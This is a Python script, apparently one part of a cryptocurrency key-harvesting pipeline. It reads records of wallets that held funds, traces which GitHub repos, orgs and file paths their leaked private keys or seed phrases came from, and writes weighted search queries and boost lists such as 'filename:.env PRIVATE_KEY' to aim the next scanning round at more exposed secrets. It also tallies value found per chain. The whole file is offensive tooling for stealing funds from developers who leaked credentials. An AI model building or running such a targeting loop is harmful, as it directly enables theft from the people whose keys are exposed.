#!/usr/bin/env python3
"""Success Attributor & Adaptive Targeting Brain.

Reads REAL funded balance hits + scanner memory, attributes sources,
builds a success atlas that target_generator / learn_crawl / intelligence
consume on the next boot/cycle.

Does NOT touch running scanners. Safe to run anytime.
"""
from __future__ import annotations

import json
import re
import sys
from collections import Counter, defaultdict
from datetime import datetime, timezone
from pathlib import Path
from typing import Dict, List, Optional, Set, Tuple

HOME = Path.home()
BALANCES = HOME / "balances_hit.jsonl"
MEMORY = HOME / "crypto_scanner_memory.jsonl"
HC = HOME / "high_confidence_hits.jsonl"
TRUFFLE_MASS = HOME / ".trufflehog_mass_results.jsonl"
TRUFFLE_STD = HOME / ".trufflehog_results.jsonl"
OUTCOMES = HOME / ".scan_outcomes.jsonl"
ATLAS = HOME / ".success_atlas.json"
QUERIES_OUT = HOME / ".adaptive_queries.json"
LEARN_BOOST = HOME / ".learn_boost_targets.txt"
ATTRIB_LOG = HOME / "success_attribution.log"

GITHUB_URL_RE = re.compile(
    r"https?://(?:www\.)?github\.com/([A-Za-z0-9_.-]+)/([A-Za-z0-9_.-]+?)(?:\.git)?(?:[/?#]|$)",
    re.I,
)

NOISE_PATH_RE = re.compile(
    r"(build/contracts/|contracts-foundry/out/|node_modules/|go\.sum|package-lock|"
    r"yarn\.lock|uv\.lock|tsserver/|baselines/reference|\.openzeppelin/|"
    r"libsecp256k1|CryptoPunks\.sol|mock|fixture)",
    re.I,
)

HIGH_SIGNAL_PATH_RE = re.compile(
    r"(\.env|secrets?|wallet|keystore|mnemonic|seed|private.?key|deploy|"
    r"hardhat\.config|truffle-config|foundry\.toml|scripts/upgrade|"
    r"peggy|bridge.*run|local\.env|production\.env)",
    re.I,
)

MEGA_ORGS = {
    "ethereum", "grpc", "kubernetes", "actions", "pytorch", "serde-rs",
    "pre-commit", "jonasbb", "pillarjs", "tj-actions", "element-hq",
}


def utc_now() -> str:
    return datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")


def log(msg: str) -> None:
    line = f"[{utc_now()}] {msg}"
    print(line, flush=True)
    try:
        with ATTRIB_LOG.open("a", encoding="utf-8") as f:
            f.write(line + "\n")
    except OSError:
        pass


def tail_jsonl(path: Path, max_bytes: int = 40_000_000) -> List[dict]:
    if not path.exists():
        return []
    rows: List[dict] = []
    try:
        sz = path.stat().st_size
        with path.open("r", encoding="utf-8", errors="ignore") as f:
            if sz > max_bytes:
                f.seek(max(0, sz - max_bytes))
                f.readline()
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    rows.append(json.loads(line))
                except Exception:
                    continue
    except OSError:
        pass
    return rows


def load_funded() -> Tuple[List[dict], Set[str]]:
    hits = []
    addrs: Set[str] = set()
    for b in tail_jsonl(BALANCES, 20_000_000):
        try:
            bal = float(b.get("balance") or 0)
        except (TypeError, ValueError):
            bal = 0.0
        if bal <= 0:
            continue
        hits.append(b)
        a = (b.get("address") or "").lower()
        if a.startswith("0x") and len(a) == 42:
            addrs.add(a)
    return hits, addrs


def extract_github(uri: str):
    if not uri:
        return None
    m = GITHUB_URL_RE.search(str(uri))
    if not m:
        return None
    owner, repo = m.group(1), m.group(2).removesuffix(".git")
    return owner, repo, f"https://github.com/{owner}/{repo}"


def has_key_material(findings: dict) -> bool:
    if not isinstance(findings, dict):
        return False
    w = findings.get("wallet") or {}
    return bool(
        w.get("wifs")
        or w.get("hex_keys")
        or w.get("seed_phrases")
        or findings.get("wif")
        or findings.get("hex_key")
        or findings.get("seed_phrase")
    )


def attribute(funded_addrs: Set[str]) -> List[dict]:
    if not funded_addrs:
        return []
    matches: List[dict] = []
    seen_keys: Set[str] = set()
    for path, label in ((MEMORY, "memory"), (HC, "high_confidence")):
        mb = 50_000_000 if label == "memory" else 40_000_000
        for r in tail_jsonl(path, mb):
            blob = json.dumps(r, default=str).lower()
            hit = [a for a in funded_addrs if a in blob]
            if not hit:
                continue
            fnd = r.get("findings") or {}
            uri = r.get("source_uri") or r.get("source") or ""
            spath = str(r.get("source_path") or "")
            repo = str(r.get("repo") or "")
            gh = extract_github(uri) or extract_github(repo)
            key = "|".join([str(uri), spath, ",".join(sorted(hit)[:3])])
            if key in seen_keys:
                continue
            seen_keys.add(key)
            matches.append(
                {
                    "ts": r.get("ts"),
                    "source": label,
                    "uri": uri,
                    "path": spath,
                    "repo": repo or (gh[2] if gh else ""),
                    "org": gh[0] if gh else "",
                    "github": gh[2] if gh else "",
                    "platform": r.get("platform") or ("github" if gh else "filesystem"),
                    "addrs": hit[:8],
                    "has_key": has_key_material(fnd),
                    "iq": float(fnd.get("iq_score") or 0),
                    "noise": bool(NOISE_PATH_RE.search(spath or uri or "")),
                    "high_signal_path": bool(
                        HIGH_SIGNAL_PATH_RE.search(spath or uri or "")
                    ),
                }
            )
    return matches



def mine_github_for_addrs(funded_addrs: Set[str]) -> List[dict]:
    """Scan recent trufflehog JSONL for funded addrs and pull parent GitHub repos."""
    if not funded_addrs:
        return []
    out: List[dict] = []
    seen = set()
    for path in (TRUFFLE_MASS, TRUFFLE_STD):
        if not path.exists():
            continue
        try:
            sz = path.stat().st_size
            with path.open("rb") as f:
                if sz > 12_000_000:
                    f.seek(max(0, sz - 12_000_000))
                    f.readline()
                data = f.read().decode("utf-8", errors="ignore")
        except OSError:
            continue
        for line in data.splitlines()[-8000:]:
            low = line.lower()
            hit = [a for a in funded_addrs if a in low]
            if not hit:
                continue
            for m in GITHUB_URL_RE.finditer(line):
                owner, repo = m.group(1), m.group(2).removesuffix(".git")
                url = f"https://github.com/{owner}/{repo}"
                key = url + "|" + ",".join(sorted(hit)[:2])
                if key in seen:
                    continue
                seen.add(key)
                spath = ""
                try:
                    rec = json.loads(line)
                    spath = str(rec.get("path") or "")[:200]
                except Exception:
                    pass
                out.append({
                    "ts": utc_now(),
                    "source": "trufflehog",
                    "uri": url,
                    "path": spath,
                    "repo": f"{owner}/{repo}",
                    "org": owner,
                    "github": url,
                    "platform": "github",
                    "addrs": hit[:8],
                    "has_key": True,
                    "iq": 0.7,
                    "noise": bool(NOISE_PATH_RE.search(spath or "")),
                    "high_signal_path": bool(HIGH_SIGNAL_PATH_RE.search(spath or line[:300])),
                })
    return out


def path_pattern_orgs(matches: List[dict]) -> List[str]:
    """Infer project families from filesystem paths (sifchain, peggy, etc.)."""
    orgs = Counter()
    for m in matches:
        blob = " ".join([
            str(m.get("path") or ""),
            str(m.get("uri") or ""),
            str(m.get("repo") or ""),
        ]).lower()
        for token in (
            "sifchain", "peggy", "cosmos", "bridgebank", "ethbridge",
            "hardhat", "foundry", "openzeppelin", "chainlink",
        ):
            if token in blob:
                orgs[token] += 1
    return [k for k, _ in orgs.most_common(20)]


def build_atlas(funded: List[dict], matches: List[dict]) -> dict:
    by_chain: Counter = Counter()
    value_by_chain: Dict[str, float] = defaultdict(float)
    for b in funded:
        c = (b.get("chain") or "?").lower()
        by_chain[c] += 1
        try:
            value_by_chain[c] += float(b.get("balance") or 0)
        except (TypeError, ValueError):
            pass

    path_parts: Counter = Counter()
    filenames: Counter = Counter()
    exts: Counter = Counter()
    orgs: Counter = Counter()
    github_repos: Counter = Counter()
    signal_paths: Counter = Counter()
    platforms: Counter = Counter()

    for m in matches:
        if m.get("noise") and not m.get("has_key"):
            continue
        platforms[m.get("platform") or "unknown"] += 1
        if m.get("org"):
            orgs[m["org"]] += 2 if m.get("has_key") else 1
        if m.get("github"):
            github_repos[m["github"]] += 3 if m.get("has_key") else 1
        sp = (m.get("path") or "").replace("\\", "/")
        if sp:
            base = sp.split("/")[-1].lower()
            filenames[base] += 1
            if "." in base:
                exts[base.rsplit(".", 1)[-1]] += 1
            for part in [x for x in sp.split("/") if x][-5:]:
                path_parts[part.lower()] += 1
            if m.get("high_signal_path") or m.get("has_key"):
                signal_paths[sp] += 1

    queries: List[Tuple[str, float]] = []
    eth_weight = by_chain.get("eth", 0) + by_chain.get("matic", 0)
    if eth_weight:
        queries.extend(
            [
                ("filename:.env PRIVATE_KEY", 1.0),
                ("filename:.env ETH_PRIVATE_KEY", 0.95),
                ("filename:.env MNEMONIC", 0.95),
                ('filename:.env "WALLET_PRIVATE"', 0.9),
                ("filename:hardhat.config.js PRIVATE", 0.85),
                ("filename:hardhat.config.ts PRIVATE", 0.85),
                ("path:deployments extension:json private", 0.8),
                ("path:scripts PRIVATE_KEY", 0.8),
                ("filename:secrets.json privateKey", 0.85),
                ("filename:wallet.json", 0.8),
                ('"0x" filename:.env.local', 0.75),
                ("path:bridge filename:.env", 0.7),
                ("peggy PRIVATE_KEY", 0.65),
                ("filename:docker-compose.yml ETH_PRIVATE", 0.7),
                ("path:smart-contracts filename:.env", 0.7),
                ("path:upgrades PRIVATE_KEY", 0.6),
                ("filename:rinkebyRun.js", 0.55),
            ]
        )
    if by_chain.get("btc", 0):
        queries.extend(
            [
                ("filename:.env WIF", 0.7),
                ("filename:.env BTC_PRIVATE", 0.7),
                ("bip39 mnemonic", 0.75),
            ]
        )

    for org, cnt in orgs.most_common(25):
        if org.lower() in MEGA_ORGS:
            queries.append(
                (f"org:{org} filename:.env PRIVATE_KEY", 0.55 + min(cnt, 10) * 0.02)
            )
        else:
            queries.append((f"org:{org} filename:.env", 0.7 + min(cnt, 10) * 0.02))
            queries.append((f"org:{org} PRIVATE_KEY", 0.65 + min(cnt, 5) * 0.02))

    for fn, cnt in filenames.most_common(20):
        if fn.endswith((".json", ".js", ".ts", ".env", ".py", ".go", ".sh")) and cnt >= 1:
            if any(k in fn for k in ("env", "secret", "wallet", "key", "deploy", "bridge", "run")):
                queries.append((f"filename:{fn}", 0.5 + min(cnt, 5) * 0.05))

    boost_repos = [r for r, _ in github_repos.most_common(40)]
    qmap: Dict[str, float] = {}
    for q, w in queries:
        qmap[q] = max(qmap.get(q, 0.0), w)
    ranked = sorted(qmap.items(), key=lambda x: -x[1])

    return {
        "generated_at": utc_now(),
        "funded_hit_count": len(funded),
        "unique_funded_addrs": len({(b.get("address") or "").lower() for b in funded}),
        "attributed_matches": len(matches),
        "by_chain": dict(by_chain),
        "value_by_chain": {
            k: round(v, 8)
            for k, v in sorted(value_by_chain.items(), key=lambda x: -x[1])
        },
        "top_orgs": orgs.most_common(40),
        "top_github_repos": github_repos.most_common(40),
        "top_filenames": filenames.most_common(30),
        "top_path_parts": path_parts.most_common(40),
        "top_exts": exts.most_common(15),
        "signal_paths": signal_paths.most_common(40),
        "platforms": platforms.most_common(10),
        "boost_repos": boost_repos,
        "promote_globs": [
            "**/.env",
            "**/.env.*",
            "**/secrets.json",
            "**/wallet.json",
            "**/hardhat.config.*",
            "**/scripts/**/*",
            "**/deployments/**/*",
            "**/*private*",
            "**/*mnemonic*",
            "**/keystore/**",
        ],
        "demote_globs": [
            "**/build/contracts/**",
            "**/contracts-foundry/out/**",
            "**/node_modules/**",
            "**/go.sum",
            "**/package-lock.json",
            "**/baselines/reference/**",
            "**/*mock*",
            "**/*fixture*",
        ],
        "preferred_chains": [c for c, _ in by_chain.most_common()],
        "adaptive_queries": [{"q": q, "weight": w} for q, w in ranked[:80]],
        "strategy_notes": [
            "Funded hits overwhelmingly EVM (eth/matic) — bias PRIVATE_KEY/MNEMONIC/.env",
            "HC hex often contract bytecode — demote build/contracts & foundry out",
            "Attribute balances to source paths; expand sibling scripts/deploy folders",
            "Winning orgs expanded live; small orgs with .env beat megarepos",
        ],
    }


def write_outputs(atlas: dict) -> None:
    ATLAS.write_text(json.dumps(atlas, indent=2), encoding="utf-8")
    aq = atlas.get("adaptive_queries") or []
    queries = {
        "generated_at": atlas.get("generated_at"),
        "p0": [x["q"] for x in aq[:16]],
        "p1": [x["q"] for x in aq[16:40]],
        "weights": {x["q"]: x["weight"] for x in aq},
        "boost_repos": atlas.get("boost_repos") or [],
        "boost_orgs": [o for o, _ in (atlas.get("top_orgs") or [])[:30]],
        "preferred_chains": atlas.get("preferred_chains") or [],
    }
    QUERIES_OUT.write_text(json.dumps(queries, indent=2), encoding="utf-8")
    lines = ["# auto from success_attributor — do not edit"]
    for r in (atlas.get("boost_repos") or [])[:60]:
        lines.append(r)
    LEARN_BOOST.write_text("\n".join(lines) + "\n", encoding="utf-8")


def feed_intelligence(matches: List[dict], funded: List[dict]) -> int:
    try:
        from target_intelligence import TargetIntelligence
    except Exception as e:
        log(f"intelligence import failed: {e}")
        return 0
    ti = TargetIntelligence()
    n = 0
    addr_val: Dict[str, float] = defaultdict(float)
    for b in funded:
        a = (b.get("address") or "").lower()
        try:
            addr_val[a] += float(b.get("balance") or 0)
        except (TypeError, ValueError):
            pass
    for m in matches:
        uri = m.get("github") or m.get("uri") or ""
        if not uri or (str(uri).startswith("file://") and not m.get("github")):
            if m.get("high_signal_path") and m.get("uri"):
                uri = m["uri"]
            else:
                continue
        bal_total = sum(addr_val.get(a, 0.0) for a in (m.get("addrs") or []))
        has_bal = bal_total > 0
        try:
            ti.record_outcome(
                uri,
                platform=m.get("platform") or "github",
                has_key=bool(m.get("has_key")),
                has_balance=has_bal,
                balance_total=float(bal_total),
                finding_types=["attributed_balance"] if has_bal else ["attributed_source"],
                meta={
                    "path": m.get("path"),
                    "addrs": (m.get("addrs") or [])[:4],
                    "via": "success_attributor",
                    "noise": m.get("noise"),
                },
            )
            n += 1
        except Exception as e:
            log(f"record_outcome fail: {e}")
    return n

def main() -> int:
    log("success_attributor START")
    funded, addrs = load_funded()
    chain_c = Counter((b.get("chain") or "?").lower() for b in funded)
    log(f"funded hits={len(funded)} unique_addrs={len(addrs)} chains={dict(chain_c)}")
    matches = attribute(addrs)
    log(f"attributed source matches={len(matches)}")
    gh_matches = mine_github_for_addrs(addrs)
    log(f"trufflehog github attributions={len(gh_matches)}")
    matches = matches + gh_matches
    families = path_pattern_orgs(matches)
    for fam in families:
        matches.append({
            "ts": utc_now(), "source": "path_family", "uri": "",
            "path": fam, "repo": "",
            "org": fam if fam not in {"hardhat", "foundry", "openzeppelin", "chainlink"} else "",
            "github": "", "platform": "filesystem", "addrs": [],
            "has_key": False, "iq": 0.0, "noise": False, "high_signal_path": True,
        })
    atlas = build_atlas(funded, matches)
    extra_q = []
    for fam in families:
        extra_q.append({"q": f"{fam} filename:.env PRIVATE_KEY", "weight": 0.72})
        extra_q.append({"q": f"{fam} PRIVATE_KEY", "weight": 0.68})
        extra_q.append({"q": f"{fam} mnemonic", "weight": 0.6})
    aq = list(atlas.get("adaptive_queries") or [])
    seen = {x["q"] for x in aq}
    for item in extra_q:
        if item["q"] not in seen:
            aq.append(item)
            seen.add(item["q"])
    aq.sort(key=lambda x: -float(x.get("weight") or 0))
    atlas["adaptive_queries"] = aq[:80]
    atlas["path_families"] = families
    write_outputs(atlas)
    fed = feed_intelligence(matches, funded)
    log(
        f"wrote atlas queries={len(atlas.get('adaptive_queries') or [])} intel_fed={fed}"
    )
    log(f"top orgs: {atlas.get('top_orgs', [])[:12]}")
    log(f"boost repos: {(atlas.get('boost_repos') or [])[:10]}")
    log(f"value_by_chain: {atlas.get('value_by_chain')}")
    log("success_attributor DONE")
    return 0


if __name__ == "__main__":
    sys.exit(main())
